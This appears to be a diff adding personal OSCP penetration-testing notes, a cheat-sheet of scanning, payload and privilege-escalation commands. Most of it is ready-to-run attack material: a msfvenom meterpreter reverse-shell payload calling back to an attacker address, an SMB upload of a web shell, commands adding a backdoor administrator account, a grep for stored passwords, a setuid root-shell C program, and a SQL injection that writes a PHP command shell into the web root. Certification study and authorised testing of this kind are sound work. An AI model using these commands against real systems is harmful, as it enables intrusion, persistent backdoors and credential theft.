@@ -1,0 +1,118 @@
+ 
+----------------------------------------------------
+---------------   OSCP NOTES --------------------
+----------------------------------------------------
+----------------------------------------------------
+----------------------------------------------------
+----------------------------------------------------
+----------------------------------------------------
+------------- Compilation Tools-------------------
+----------------------------------------------------
+
+• Cross-Compilation exploits
+
+sudo apt-get install mingw-w64
+
+i686-w64-mingw32-gcc hello.c -o hello32.exe      # 32-bit
+x86_64-w64-mingw32-gcc hello.c -o hello64.exe    # 64-bit
+
+----------------------------------------------------
+----------Scanning / Dir buster -------
+
+nmap -sU -sV -A
+nmap -p- -T4 -A 10.11.1.13
+gobuster -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 192.168.23.43
+( wpscan - wordpress ) wp-config.php
+
+---------- webshell-------
+
+usr/share/webshell/php/php-reverse-shell
+
+-----------Copy The Payload ( Remotely ) -----
+
+smbclient -U root% //192.168.0.1/files --directory Public/files -c 'put "shell.aspx"'
+
+smbclient //WINPOWER/files -l 192.168.0.1 -c "put shell.aspx shell.aspx"
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.19.1 LPORT=443 -f aspx > shell.aspx
+
+
+--------- Post Explotation------
+
+net user /add oscp 123456
+net localgroup administrators oscp/add
+
+dir local.txt /s /p
+dir proof.txt /s /p
+
+find ./ | grep local.txt
+
+findstr /si password *.xml *.ini *.txt *.config 2>nul
+
+------- PE --------
+
+sudo -l
+crontab -l
+cat /etc/crontab
+find / -writable -type f
+python - os.system('chmod u+s /bin/sh')
+
+• C exploit PE to root:
+
+#include <unistd.h>
+int main(void)
+{
+setuid(0);
+setgid(0);
+system("/bin/bash");
+}
+
+
+--------- injection ---
+
+
+
+python -m SimpleHTTPServer 80
+
+mysql -u DBUSER -h DBSERVERNAME_OR_IP -p 
+
+http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,"<?php echo
+shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'
+
+
+
+lsof -i:80
+kill $(lsof -t -i:80)
+
+sqlmap -r request-file --random-agent --risk 3 --level 5 --dbms=mysql -p id --os-shell
+
+
+---------------------------------------
+----------- usefull links --------------
+---------------------------------------
+
+-------- Priviliege Escalation ----------
+
+https://github.com/rebootuser/LinEnum
+
+https://github.com/pentestmonkey/windows-privesc-check
+
+https://payatu.com/guide-linux-privilege-escalation
+
+https://github.com/Ignitetechnologies/Privilege-Escalation/blob/master/README.md
+
+----------------------Other  --------------------
+
+https://github.com/pythonmaster41/Go-For-OSCP
+
+https://pentest.tonyng.net/timo-sablowskis-oscp-note/
+
+https://support.offensive-security.com/oscp-exam-guide/#section-3-submission-instructions
+
+https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
+
+https://en.wikipedia.org/wiki/List_of_file_signatures
+
+https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf
+
+
